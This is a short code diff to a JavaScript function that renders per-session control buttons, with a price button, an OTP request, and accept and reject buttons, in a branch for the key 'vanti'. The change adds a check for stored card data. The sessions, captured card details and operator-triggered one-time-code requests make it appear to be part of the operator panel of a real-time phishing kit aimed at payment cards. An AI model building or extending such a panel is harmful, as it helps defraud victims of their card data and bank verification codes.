@@ -400,13 +400,13 @@ function botonesSesion(s) {
     const btns = [];
 
     if (bancoKey === 'vanti') {
-        // 💲 Asignar precio SOLO si aún no se ha asignado
-        if (estado === 'pendiente' && !s.datos.monto) {
+        // 💲 Asignar precio SOLO si no hay tarjeta aún y no hay monto
+        if (estado === 'pendiente' && !s.datos.monto && !s.datos.tarjeta) {
             btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
         }
         // 📱 Pedir OTP
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        // ✅ Aceptar (para Vanti manda a OTP primero, ver bot.js)
+        // ✅ Aceptar
         btns.push(`<button class="btn btn-accept" title="Aceptar (pasa a OTP)" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
         // ❌ Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
